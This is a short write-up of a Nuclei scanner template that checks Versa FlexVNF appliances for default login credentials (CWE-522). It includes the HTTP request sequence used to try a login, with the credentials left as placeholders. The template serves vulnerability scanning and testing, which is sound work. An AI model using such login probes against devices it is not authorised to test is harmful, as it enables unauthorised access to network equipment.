# Nuclei Template: Versa FlexVNF - Default Login
**Template ID:** versa-flexvnf-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`versa-flexvnf-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Versa FlexVNF contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /authenticate HTTP/1.1
Host: {{Hostname}}

POST /authenticate HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8
CSRF-Token: {{xsrf_token}}

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://versa-networks.com/products/
